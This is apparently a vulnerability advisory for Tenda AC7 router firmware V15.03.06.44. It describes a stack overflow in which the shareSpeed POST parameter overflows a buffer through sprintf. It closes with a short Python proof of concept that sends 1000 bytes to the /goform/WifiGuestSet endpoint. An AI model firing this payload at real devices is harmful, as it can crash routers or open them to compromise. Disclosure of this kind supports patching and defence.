## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

The Tenda  AC7V1.0 V15.03.06.44 firmware has a stack overflow vulnerability in the `fromSetWifiGusetBasic` function. The `shared_down_speed` variable receives the `shareSpeed` parameter from a POST request and is later passed to function `set_wl_guest_qos_list`. However, since the user can control the input of  `shareSpeed`, in function `set_wl_guest_iplist`, the statement `sprintf` can cause a stack overflow. The user-provided  `shareSpeed` can exceed the capacity of the `qos_iprule` array, triggering this security vulnerability.

![image-20240318185619960](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318185619960.png)

![image-20240318185800602](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318185800602.png)



![image-20240318185609508](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318185609508.png)

![image-20240318185936442](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318185936442.png)

![image-20240318185906557](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318185906557.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiGuestSet"
payload = b"a"*1000

data = {"shareSpeed": payload}
response = requests.post(url, data=data)
print(response.text)
```

